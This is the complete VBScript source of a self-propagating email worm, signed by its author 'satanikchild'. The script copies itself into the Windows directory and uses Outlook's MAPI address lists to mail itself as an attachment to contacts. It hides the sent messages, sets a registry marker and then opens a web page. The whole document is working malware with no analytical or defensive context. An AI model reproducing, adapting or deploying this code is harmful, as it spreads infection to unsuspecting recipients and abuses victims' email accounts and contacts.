'VBS/newone by satanikchild
On Error Resume Next
Set ws = CreateObject("Wscript.Shell")
Set look = ws.RegRead("HKEY_CURRENT_USER\Software\newworm\")
If (look = "") Then
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, fso.GetSpecialFolder(0) & "\newworm.vbs"
Set out = Wscript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For lists = 1 to mapi.AddressLists.Count
Set lists2 = mapi.AddressLists(lists)
x = 1
recips = lists2.AddressEntries(x)
Set email = out.CreateItem(0)
email.Recipients.Add(recips)
email.Subject = "im sending this worm to you."
email.Body = "i am trying to infect you!"
email.Attachments.Add "C:\WINDOWS\newworm.vbs"
email.DeleteAfterSubmit = True
email.Send
Next
ws.RegWrite "HKEY_CURRENT_USER\Software\newworm\", "Worm written by Satanik Child"
ws.run "http://www.msn.com", 3, false
End If

